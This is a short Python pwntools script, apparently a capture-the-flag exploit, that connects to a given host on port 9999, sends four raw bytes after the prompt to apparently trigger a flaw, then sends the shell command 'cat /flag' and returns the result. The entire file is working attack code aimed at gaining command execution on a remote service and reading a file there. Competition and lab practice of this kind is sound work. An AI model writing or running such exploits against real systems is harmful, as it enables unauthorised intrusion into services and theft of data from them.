from pwn import *
import sys
context.log_level = "debug"

def exp1(ip:str, port:int):
    try:
        p = remote(ip, port)
        p.recvuntil(b"> ")
        p.send(b"\x21\x23\x89\x33")
        p.recv(timeout=1)
        p.sendline("cat /flag")
        return p.readline().strip()
    except:
        try:
            p.close()
        except:
            pass
        return None

if __name__ == "__main__":
    exp1(sys.argv[1], 9999)
